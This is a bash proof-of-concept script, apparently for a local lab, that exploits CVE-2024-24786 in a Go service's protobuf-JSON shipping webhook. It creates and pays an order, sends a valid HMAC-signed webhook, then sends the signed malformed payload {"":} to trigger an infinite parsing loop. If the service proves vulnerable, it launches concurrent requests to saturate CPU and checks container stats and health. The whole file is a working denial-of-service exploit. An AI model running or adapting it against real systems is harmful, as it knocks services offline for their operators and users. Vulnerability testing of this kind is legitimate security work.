#!/bin/bash
#
# attack.sh — CVE-2024-24786 protojson DoS on shipping webhook v2
#
# Demonstracija beskonačne petlje u protojson.Unmarshal parseru.
#
# Trigger payload: {"":}
#
# Usage: ./attack.sh [base_url] [webhook_secret]
#

set -euo pipefail

BASE_URL="${1:-http://localhost:8080}"
WEBHOOK_SECRET="${2:-super-secret-webhook-key-2024}"
MAX_RETRIES=5
ATTACK_TIMEOUT=8
CONCURRENT_ATTACKS=5

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

echo ""
echo "=== CVE-2024-24786 Attack (Shipping Webhook v2 — Protobuf JSON DoS) ==="
echo "Target: $BASE_URL"
echo "Secret: $WEBHOOK_SECRET"
echo ""

# ── 0) Health check ──────────────────────────────────────────────────────────
if ! curl -sf "$BASE_URL/health" > /dev/null 2>&1; then
    echo -e "${RED}ERROR: servis nije dostupan na $BASE_URL${NC}"
    exit 1
fi
echo -e "${GREEN}0. Servis je aktivan${NC}"

# ── 1) Kreiranje porudžbine ──────────────────────────────────────────────────
RESP=$(curl -s -X POST "$BASE_URL/orders" \
    -H "Content-Type: application/json" \
    -d '{"customer_id":"victim_proto","items":[{"product_id":"phone-01","quantity":1,"price":999.99}]}')

ORDER_ID=$(echo "$RESP" | jq -r '.order_id // empty')
if [ -z "$ORDER_ID" ]; then
    echo -e "${RED}ERROR: nije moguće kreirati porudžbinu${NC}"
    exit 1
fi
TOTAL=$(echo "$RESP" | jq -r '.total')
echo "1. Kreirana porudžbina $ORDER_ID (total=\$$TOTAL)"

# ── 2) Plaćanje ──────────────────────────────────────────────────────────────
for attempt in $(seq 1 $MAX_RETRIES); do
    PAY_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$BASE_URL/orders/$ORDER_ID/pay" \
        -H "Content-Type: application/json" \
        -d '{"payment_id":"pay_proto_001"}')
    [ "$PAY_CODE" = "200" ] && break
    sleep 1
done
if [ "$PAY_CODE" != "200" ]; then
    echo -e "${RED}ERROR: plaćanje neuspješno (HTTP $PAY_CODE)${NC}"
    exit 1
fi
echo "2. Porudžbina plaćena"

# ── 3) Isporuka ──────────────────────────────────────────────────────────────
for attempt in $(seq 1 $MAX_RETRIES); do
    SHIP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$BASE_URL/orders/$ORDER_ID/ship")
    [ "$SHIP_CODE" = "200" ] && break
    sleep 1
done
if [ "$SHIP_CODE" != "200" ]; then
    echo -e "${RED}ERROR: isporuka neuspješna (HTTP $SHIP_CODE)${NC}"
    exit 1
fi
echo "3. Porudžbina poslata (state=SHIPPING)"

# ── 4) Validan v2 webhook (kontrolni korak) ──────────────────────────────────
TIMESTAMP=$(date +%s)
SHIPMENT_ID="SH-$(echo "$ORDER_ID" | cut -c1-8)"

INNER_EVENT=$(jq -nc \
  --arg sid "$SHIPMENT_ID" \
  --arg oid "$ORDER_ID" \
  --arg et "status_update" \
  --arg st "IN_TRANSIT" \
  --argjson ts "$TIMESTAMP" \
  '{shipment_id:$sid,order_id:$oid,event_type:$et,status:$st,timestamp:$ts}')

LEGIT_PAYLOAD=$(jq -nc \
  --arg t "type.googleapis.com/google.protobuf.StringValue" \
  --arg v "$INNER_EVENT" \
  '{"@type":$t,value:$v}')

LEGIT_SIG=$(printf '%s' "$LEGIT_PAYLOAD" | openssl dgst -sha256 -hmac "$WEBHOOK_SECRET" 2>/dev/null | awk '{print $NF}')

LEGIT_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$BASE_URL/webhooks/shipping/v2" \
    -H "Content-Type: application/json" \
    -H "X-Webhook-Signature: $LEGIT_SIG" \
    -d "$LEGIT_PAYLOAD")

echo "4. Poslan validan protobuf-JSON webhook -> HTTP $LEGIT_CODE"

if [ "$LEGIT_CODE" != "200" ]; then
    echo -e "${RED}ERROR: validan v2 webhook odbijen (HTTP $LEGIT_CODE)${NC}"
    exit 1
fi

# ── 5) Napadački payload: {"":} ──────────────────────────────────────────────

MALFORMED_PAYLOAD='{"":}'
MAL_SIG=$(printf '%s' "$MALFORMED_PAYLOAD" | openssl dgst -sha256 -hmac "$WEBHOOK_SECRET" 2>/dev/null | awk '{print $NF}')

echo ""
echo -e "${CYAN}5. Slanje napadačkog payload-a: ${MALFORMED_PAYLOAD}${NC}"
echo "   (očekivano: timeout/${ATTACK_TIMEOUT}s na ranjivom parseru)"
echo ""

set +e
ATTACK_START=$(date +%s%N)

ATTACK_RAW=$(curl -sS --max-time "$ATTACK_TIMEOUT" -w "\n%{http_code}" -X POST "$BASE_URL/webhooks/shipping/v2" \
    -H "Content-Type: application/json" \
    -H "X-Webhook-Signature: $MAL_SIG" \
    -d "$MALFORMED_PAYLOAD" 2>&1)
ATTACK_EXIT=$?

ATTACK_END=$(date +%s%N)
ELAPSED_MS=$(( (ATTACK_END - ATTACK_START) / 1000000 ))
set -e

echo "--- Rezultat pojedinačnog napada ---"

if [ $ATTACK_EXIT -ne 0 ]; then
    echo -e "  curl exit code: ${RED}$ATTACK_EXIT${NC} (timeout)"
    echo "  Trajanje: ${ELAPSED_MS}ms (>= ${ATTACK_TIMEOUT}s timeout)"
    echo ""
    echo -e "${RED}RANJIVO: napadački payload uzrokovao beskonačnu petlju u parseru.${NC}"
    echo "  Handler se nije vratio u roku od ${ATTACK_TIMEOUT}s."
    VULNERABLE=true
else
    ATTACK_CODE=$(echo "$ATTACK_RAW" | tail -1)
    ATTACK_BODY=$(echo "$ATTACK_RAW" | sed '$d')

    echo "  HTTP code: $ATTACK_CODE"
    echo "  Body: $ATTACK_BODY"
    echo "  Trajanje: ${ELAPSED_MS}ms"
    echo ""

    if [ "$ATTACK_CODE" = "400" ]; then
        echo -e "${GREEN}NIJE RANJIVO (patchovano): napadački payload odmah odbijen.${NC}"
        VULNERABLE=false
    else
        echo -e "${YELLOW}NEODREĐENO: neočekivan odgovor, provjerite logove servisa.${NC}"
        VULNERABLE=false
    fi
fi

# ── 6) Konkurentni DoS (samo ako je ranjivo) ────────────────────────────────
if [ "$VULNERABLE" = "true" ]; then
    echo ""
    echo -e "${CYAN}6. Pokretanje konkurentnog DoS napada ($CONCURRENT_ATTACKS zahtjeva)...${NC}"
    echo ""

    PIDS=()
    for i in $(seq 1 $CONCURRENT_ATTACKS); do
        curl -sS --max-time "$ATTACK_TIMEOUT" -o /dev/null \
            -X POST "$BASE_URL/webhooks/shipping/v2" \
            -H "Content-Type: application/json" \
            -H "X-Webhook-Signature: $MAL_SIG" \
            -d "$MALFORMED_PAYLOAD" 2>/dev/null &
        PIDS+=($!)
    done

    sleep 2

    echo "   Docker stats (tokom napada):"
    echo ""
    docker stats --no-stream --format "   {{.Name}}  CPU: {{.CPUPerc}}  MEM: {{.MemUsage}}" ordering-service 2>/dev/null || true
    echo ""

    # Provjera da li health endpoint još odgovara
    set +e
    HEALTH_RAW=$(curl -sS --max-time 3 "$BASE_URL/health" 2>&1)
    HEALTH_EXIT=$?
    set -e

    if [ $HEALTH_EXIT -eq 0 ]; then
        echo -e "   Health check: ${GREEN}dostupan${NC} (ali CPU je zasićen)"
    else
        echo -e "   Health check: ${RED}nedostupan${NC} (servis preopterećen)"
    fi

    # Čekanje da se curl procesi završe (timeout)
    for pid in "${PIDS[@]}"; do
        wait "$pid" 2>/dev/null || true
    done
fi

echo ""
